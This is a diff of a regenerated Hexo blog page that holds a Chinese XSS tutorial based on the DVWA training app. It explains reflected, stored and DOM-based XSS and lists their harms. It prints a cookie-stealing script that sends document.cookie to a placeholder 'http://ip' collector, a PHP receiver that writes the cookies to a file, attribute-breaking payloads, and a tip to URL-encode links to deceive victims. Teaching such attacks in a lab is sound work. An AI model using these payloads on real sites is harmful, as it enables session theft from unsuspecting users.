@@ -4,7 +4,7 @@
   <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
 <meta name="theme-color" content="#222">
-<meta name="generator" content="Hexo 5.2.0">
+<meta name="generator" content="Hexo 5.4.0">
 
 
   <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
@@ -210,7 +210,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <section class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#xss%E6%94%BB%E5%87%BB%E6%A6%82%E8%BF%B0"><span class="nav-text">XSS攻击概述</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#xss%E5%8D%B1%E5%AE%B3"><span class="nav-text">XSS危害</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#xss%E5%8E%9F%E7%90%86"><span class="nav-text">XSS原理</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8B"><span class="nav-text">1.反射型</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8B"><span class="nav-text">2.存储型</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#domxss"><span class="nav-text">3.DOMXSS</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8Bxss%E5%AE%9E%E4%BE%8B"><span class="nav-text">反射型XSS实例</span></a></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#XSS%E6%94%BB%E5%87%BB%E6%A6%82%E8%BF%B0"><span class="nav-text">XSS攻击概述</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#XSS%E5%8D%B1%E5%AE%B3"><span class="nav-text">XSS危害</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#XSS%E5%8E%9F%E7%90%86"><span class="nav-text">XSS原理</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-%E5%8F%8D%E5%B0%84%E5%9E%8B"><span class="nav-text">1.反射型</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-%E5%AD%98%E5%82%A8%E5%9E%8B"><span class="nav-text">2.存储型</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-DOMXSS"><span class="nav-text">3.DOMXSS</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8BXSS%E5%AE%9E%E4%BE%8B"><span class="nav-text">反射型XSS实例</span></a></li></ol></div>
         </section>
         <!--/noindex-->
 
@@ -354,50 +354,43 @@
     
     
     <div class="post-body" itemprop="articleBody">
-        <p>　　通过DVWA学习这个挺好<a id="more"></a></p>
-<h1 id="xss攻击概述">XSS攻击概述</h1>
-<p>　　XSS攻击又叫CSS（Cross Site Script），恶意攻击者在web页面中会插入一些恶意的script代码。当用户浏览该页面的时候，那么嵌入到web页面中script代码会执行，因此会达到恶意攻击用户的目的。</p>
+        <p>　　通过DVWA学习这个挺好<span id="more"></span></p>
+<h1 id="XSS攻击概述"><a href="#XSS攻击概述" class="headerlink" title="XSS攻击概述"></a>XSS攻击概述</h1><p>　　XSS攻击又叫CSS（Cross Site Script），恶意攻击者在web页面中会插入一些恶意的script代码。当用户浏览该页面的时候，那么嵌入到web页面中script代码会执行，因此会达到恶意攻击用户的目的。</p>
 <p>　　它和SQL注入攻击相似，SQL注入攻击中以SQL语句作为用户输入，从而达到查询/修改/删除数据的目的，而XSS攻击是通过插入恶意脚本，实现对用户浏览器的控制，获取用户信息。</p>
-<figure>
-<img src="https://s3.ax1x.com/2021/01/14/sUIOVe.md.png" alt="sUIOVe.md.png" /><figcaption aria-hidden="true">sUIOVe.md.png</figcaption>
-</figure>
-<h1 id="xss危害">XSS危害</h1>
-<ul>
-<li><p>挂马</p></li>
-<li><p>盗取用户Cookie。</p></li>
-<li><p>DOS（拒绝服务）客户端浏览器。</p></li>
-<li><p>钓鱼攻击，高级的钓鱼技巧。</p></li>
-<li><p>删除目标文章、恶意篡改数据、嫁祸。</p></li>
-<li><p>劫持用户Web行为，甚至进一步渗透内网。</p></li>
-<li><p>爆发Web2.0蠕虫。</p></li>
-<li><p>蠕虫式的DDoS攻击。</p></li>
-<li><p>蠕虫式挂马攻击、刷广告、刷浏量、破坏网上数据等。</p></li>
+<p><img src="https://s3.ax1x.com/2021/01/14/sUIOVe.md.png" alt="sUIOVe.md.png"></p>
+<h1 id="XSS危害"><a href="#XSS危害" class="headerlink" title="XSS危害"></a>XSS危害</h1><ul>
+<li>挂马</li>
 </ul>
-<h1 id="xss原理">XSS原理</h1>
-<p>例如：</p>
+<ul>
+<li>盗取用户Cookie。</li>
+<li>DOS（拒绝服务）客户端浏览器。</li>
+<li>钓鱼攻击，高级的钓鱼技巧。</li>
+<li>删除目标文章、恶意篡改数据、嫁祸。</li>
+<li>劫持用户Web行为，甚至进一步渗透内网。</li>
+<li>爆发Web2.0蠕虫。</li>
+<li>蠕虫式的DDoS攻击。</li>
+<li>蠕虫式挂马攻击、刷广告、刷浏量、破坏网上数据等。</li>
+</ul>
+<h1 id="XSS原理"><a href="#XSS原理" class="headerlink" title="XSS原理"></a>XSS原理</h1><p>例如：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> $_GET[<span class="string">&quot;uname&quot;</span>],</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>当用户访问<code>url?uname=&lt;script&gt;alert("hello");&lt;/script&gt;</code>时，触发代码，弹出对话框。</p>
-<h2 id="反射型">1.反射型</h2>
-<p>攻击者通过邮件等形式将包含XSS代码的链接发送给正常用户，当用户点击时，服务器接受该用户的请求并进行处理，然后把带有XSS的代码发送给用户。用户浏览器解析执行代码，触发XSS漏洞。</p>
+<p>当用户访问<code>url?uname=&lt;script&gt;alert(&quot;hello&quot;);&lt;/script&gt;</code>时，触发代码，弹出对话框。</p>
+<h2 id="1-反射型"><a href="#1-反射型" class="headerlink" title="1.反射型"></a>1.反射型</h2><p>攻击者通过邮件等形式将包含XSS代码的链接发送给正常用户，当用户点击时，服务器接受该用户的请求并进行处理，然后把带有XSS的代码发送给用户。用户浏览器解析执行代码，触发XSS漏洞。</p>
 <p>只会执行一次，重复利用。</p>
 <p>DVWA反射</p>
 <p><code>&lt;script&gt;alert(document.cookie);&lt;/script&gt;</code></p>
-<h2 id="存储型">2.存储型</h2>
-<p>攻击脚本存储在目标服务器的数据库中，具有更强的隐蔽性。</p>
+<h2 id="2-存储型"><a href="#2-存储型" class="headerlink" title="2.存储型"></a>2.存储型</h2><p>攻击脚本存储在目标服务器的数据库中，具有更强的隐蔽性。</p>
 <p>DVWA存储型</p>
 <p>攻击者在论坛、博客、留言板中、发帖的过程中嵌入XSS攻击代码，帖子被目标服务器存储在数据库中。用户正常访问，触发XSS代码。</p>
-<h2 id="domxss">3.DOMXSS</h2>
-<p>全称Document Object Model</p>
+<h2 id="3-DOMXSS"><a href="#3-DOMXSS" class="headerlink" title="3.DOMXSS"></a>3.DOMXSS</h2><p>全称Document Object Model</p>
 <p>不需要服务器参与，触发XSS靠的是浏览器端的DOM解析，完全是客户端的事情。</p>
-<p>不经过后端。这种类型是利用非法输入来闭合对应的html标签。如，a标签：<code>&lt;a href=='$var'&gt;&lt;/a&gt;</code>，当$var内容变为<code>’ οnclick=’alert(/xss/) //</code>这段代码就会被执行。</p>
-<h1 id="反射型xss实例">反射型XSS实例</h1>
-<p>Cookie在HTTP协议下，服务器或脚本可以维护客户工作站上信息的一种方式，保存在用户浏览器上（客户端）的小文本文件，包含有关用户信息。最典型的应用就是判定用户是否已经登录网站，用户可能会得到提示：是否下一次进入网站时保留用户信息以便简化登录手续。</p>
+<p>不经过后端。这种类型是利用非法输入来闭合对应的html标签。如，a标签：<code>&lt;a href==&#39;$var&#39;&gt;&lt;/a&gt;</code>，当$var内容变为<code>’ οnclick=’alert(/xss/) //</code>这段代码就会被执行。</p>
+<h1 id="反射型XSS实例"><a href="#反射型XSS实例" class="headerlink" title="反射型XSS实例"></a>反射型XSS实例</h1><p>Cookie在HTTP协议下，服务器或脚本可以维护客户工作站上信息的一种方式，保存在用户浏览器上（客户端）的小文本文件，包含有关用户信息。最典型的应用就是判定用户是否已经登录网站，用户可能会得到提示：是否下一次进入网站时保留用户信息以便简化登录手续。</p>
 <p>DVWA</p>
 <p>使用以下脚本文件</p>
 <p>cookie.php</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $cookie=$_GET(<span class="string">&#x27;cookie&#x27;</span>);</span><br><span class="line">file_put_contents(<span class="string">&#x27;cookie.txt&#x27;</span>,$cookie);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <p>注入</p>
-<p><code>url?uname=&lt;script&gt;document.location='http://ip/xss_test/cookie/cookie.php?cookie='+document.cookie;&lt;/script&gt;</code></p>
+<p><code>url?uname=&lt;script&gt;document.location=&#39;http://ip/xss_test/cookie/cookie.php?cookie=&#39;+document.cookie;&lt;/script&gt;</code></p>
 <p>将链接发送到用户，用户点击即触发XSS漏洞，同时可以使用URL编码迷惑用户。</p>
 
     </div>
